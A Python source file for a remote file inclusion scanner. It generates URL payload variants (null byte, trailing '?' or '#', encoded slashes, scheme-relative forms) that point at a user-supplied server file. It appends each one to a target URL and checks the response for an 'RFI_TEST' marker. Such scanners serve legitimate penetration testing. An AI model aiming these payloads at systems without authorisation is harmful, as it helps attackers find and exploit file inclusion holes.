import requests
from rich import print


def generate_payloads(server, file):
    base = f"{server}/{file}"

    payloads = [
        base,
        base.replace("http://", "https://"),
        f"//{server.replace('http://','').replace('https://','')}/{file}",
        base + "%00",
        base + "?",
        base.replace("http://", "http:%2F%2F"),
        base.replace("/", "//"),
        base + "#",
    ]

    return payloads


def test_rfi(url, server, file):
    print(f"[bold red]>   Does the [bold blue]{file} [bold red]file contain only the text [bold blue]'RFI_TEST' [bold yellow](Y/N)[bold red] ? ")
    input_string = str.lower(input())

    if input_string != "y":
        if input_string == "n":
            print(f"[bold red]Edit [bold blue]{file}[/bold blue] & add only text [bold blue]'RFI_TEST'[bold red] !!")
        print("\n[bold red]Invalid Option !![/bold red]")
        exit(0)

    print(f"\n[bold red]Url:[bold yellow] {url}")
    print(f"[bold red]Server:[bold yellow] {server}")
    print(f"[bold red]File:[bold yellow] {file}")

    payloads = generate_payloads(server, file)

    print(f"\n[bold yellow]Performing RFI Scan ... \n")

    try:
        for payload in payloads:
            target = url + payload

            try:
                r = requests.get(target, timeout=10)
                if "RFI_TEST" in r.text:
                    print(f"[bold green][+] RFI detected with payload: [bold yellow]{payload}\n")
                    return

            except requests.exceptions.RequestException:
                pass

    except KeyboardInterrupt:
        print("[bold red][!] Scan interrupted by user (CTRL+C)[/bold red]\n")
        return

    print(f"\n[bold red][-] RFI not detected[/bold red]\n")